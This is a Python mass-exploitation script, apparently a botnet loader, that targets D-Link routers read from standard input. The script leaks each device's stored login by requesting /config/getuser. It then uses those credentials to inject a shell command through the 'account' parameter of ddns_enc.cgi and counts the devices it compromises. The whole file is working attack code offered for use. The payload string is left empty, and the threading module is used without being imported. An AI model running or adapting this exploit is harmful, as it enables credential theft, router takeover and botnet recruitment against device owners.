import base64
import socket
import sys
import time
import string

statusAttempted = 0
statusLogins = 0
statusFound = 0
statusVuln = 0
statusClean = 0
#go dlink recoded in python cause y not LMAO SKIDDDSSSSSSS Made By FrostedFlakes666
CONNECT_TIMEOUT = 30
READ_TIMEOUT = 15
READ_2_TIMEOUT = 5
WRITE_TIMEOUT = 10

payload = ""

def zero_byte(a):
    for i in range(len(a)):
        a[i] = 0x00

def strip_byte(a):
    for i in range(len(a)):
        if a[i] == 0x0D or a[i] == 0x0A:
            a[i] = 0x00

def set_write_timeout(conn, timeout):
    conn.settimeout(timeout)

def set_read_timeout(conn, timeout):
    conn.settimeout(timeout)

def get_string_in_between(str, start, end):
    s = str.find(start)
    if s == -1:
        return ""
    
    s += len(start)
    e = str.find(end, s)

    if s > 0 and e > s+1:
        return str[s:e]
    else:
        return "null"

def process_target(target):
    global statusAttempted, statusLogins, statusFound, statusVuln, statusClean

    statusAttempted += 1

    try:
        conn = socket.create_connection(target, CONNECT_TIMEOUT)
    except socket.error:
        return

    conn.settimeout(WRITE_TIMEOUT)
    conn.sendall(b"GET /config/getuser?index=0 HTTP/1.1\r\nHost: " + target.encode() + b"\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n")

    conn.settimeout(READ_TIMEOUT)
    bytebuf = bytearray(512)
    try:
        l = conn.recv_into(bytebuf)
    except socket.error:
        zero_byte(bytebuf)
        conn.close()
        return

    strip_byte(bytebuf)
    conn.close()

    if "name=" in str(bytebuf) and "pass=" in str(bytebuf) and "priv=" in str(bytebuf):
        statusFound += 1
    else:
        zero_byte(bytebuf)
        return
#Made By FrostedFlakes666
    usernameIn = get_string_in_between(str(bytebuf), "name=", "pass=")
    passwordIn = get_string_in_between(str(bytebuf), "pass=", "priv=")

    username = "".join(filter(lambda x: x in string.printable, usernameIn))
    password = "".join(filter(lambda x: x in string.printable, passwordIn))

    if len(username) <= 0 or len(password) <= 0:
        zero_byte(bytebuf)
        return
    else:
        zero_byte(bytebuf)
        statusLogins += 1

    b64auth = base64.b64encode((username + ":" + password).encode()).decode()

    try:
        conn = socket.create_connection(target, CONNECT_TIMEOUT)
    except socket.error:
        return

    conn.settimeout(WRITE_TIMEOUT)
    conn.sendall(b"GET /cgi-bin/ddns_enc.cgi?enable=1&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=;" + payload.encode() + b"; HTTP/1.1\r\nHost: " + target.encode() + b"\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth.encode() + b"\r\n\r\n")

    conn.settimeout(READ_TIMEOUT)
    try:
        l = conn.recv_into(bytebuf)
    except socket.error:
        zero_byte(bytebuf)
        conn.close()
        return

    conn.close()
    time.sleep(15)
#Made By FrostedFlakes666
    try:
        conn = socket.create_connection(target, CONNECT_TIMEOUT)
    except socket.error:
        return

    conn.settimeout(WRITE_TIMEOUT)
    conn.sendall(b"GET /cgi-bin/ddns_enc.cgi?enable=0&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=aaaa HTTP/1.1\r\nHost: " + target.encode() + b"\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth.encode() + b"\r\n\r\n")

    conn.settimeout(READ_TIMEOUT)
    try:
        l = conn.recv_into(bytebuf)
    except socket.error:
        zero_byte(bytebuf)
        conn.close()
        return

    if "service=www.dlinkddns.com" in str(bytebuf):
        statusVuln += 1

    conn.close()

def main():
    global statusAttempted, statusLogins, statusFound, statusVuln, statusClean

    i = 0

    if len(sys.argv) != 2:
        print("[Scanner] Missing argument (port/listen)")
        return

    def print_status():
        nonlocal i
        while True:
            print(f"{i}'s | Total {statusAttempted} | Device Found: {statusFound} | Authenticated: {statusLogins} | Payload Sent: {statusVuln} | Made By FrostedFlakes666")
            time.sleep(1)
            i += 1

    t = threading.Thread(target=print_status)
    t.start()

    while True:
        for line in sys.stdin:
            target = line.strip()
            if sys.argv[1] == "listen":
                process_target((target, 80))
            else:
                process_target((target, int(sys.argv[1])))

if __name__ == "__main__":
    main()